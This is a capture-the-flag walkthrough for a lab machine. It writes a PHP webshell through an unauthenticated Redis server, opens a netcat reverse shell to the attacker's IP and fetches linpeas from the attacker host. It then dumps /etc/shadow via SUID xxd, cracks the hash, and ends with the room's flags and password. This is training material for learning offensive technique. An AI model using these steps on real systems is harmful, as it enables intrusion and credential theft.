# Res - Easy

```shell
nmap -T4 -p- -A -v 10.10.247.238

redis-cli -h 10.10.247.238 -p 6379

#in redis-cli
info

config set dir /var/www/html

config set dbfilename redis.php

set test "<?php system($_GET['cmd']); ?>"

save

#setup listener
nc -nvlp 4444
#execute the commands on webshell to get reverse shell

id

python3 -c 'import pty;pty.spawn("/bin/bash")'

#in attacker machine
python3 -m http.server

#in reverse shell
cd /tmp

wget http://10.14.31.212:8000/linpeas.sh

chmod +x linpeas.sh

./linpeas.sh

#xxd has SUID bit set

#exploit from GTFObins
LFILE=/etc/shadow

/usr/bin/xxd "$LFILE" | xxd -r
#dumps hash

#crack hash
hashcat -a 0 -m 1800 hash.txt /usr/share/wordlists/kaonashi.txt
#we get password

su vianka
#get user flag

sudo -l
#we can run all commands as all users

sudo cat /root/root.txt
```

* Open ports & services:

  * 80 - http - Apache httpd 2.4.18 (Ubuntu)
  * 6379 - redis - Redis key-value store 6.0.7

* The page on port 80 is the default landing page for Apache.

* We can try connecting to the redis service on port 6379.

* Using ```redis-cli```, we are able to interact with the database management system.

* Googling for 'redis hacktricks' gives us techniques for uploading a simple webshell.

* Assuming the default path of '/var/www/html' for Apache web folder, we can upload a shell for RCE.

* Now, if we access <http://10.10.247.238/redis.php?cmd=whoami>, we can see that our command gets executed - we are 'www-data'.

* So, we can setup a listener and get reverse-shell, by executing these commands:

  ```which nc```

  ```nc -c sh 10.14.31.212 4444```

* This gives us a reverse-shell on our listener.

* We can check for privesc using ```linpeas```.

* Now, this shows that 'xxd' binary has SUID bit set - we can get exploit from GTFObins for this.

* Using exploit, we are able to dump the /etc/shadow file - this gives us the hash for 'vianka' user.

* From the Hashcat wiki, we can see that this is a sha512crypt hash - we can crack it using ```hashcat```.

* Cracking the hash gives us the password 'beautiful1' - we can now login as vianka.

* Using ```sudo -l```, it is evident that we can run all commands as all users, including sudo - so we can get root flag.

```markdown
1. Scan the machine, how many ports are open? - 2

2. What is the database management system installed on the server? - redis

3. What port is the database management system running on? - 6379

4. What is the version of management system installed on the server? - 6.0.7

5. Compromise the machine and locate user.txt - thm{red1s_rce_w1thout_credent1als}

6. What is the local user account password? - beautiful1

7. Escalate privileges and obtain root.txt - thm{xxd_pr1v_escalat1on}
```
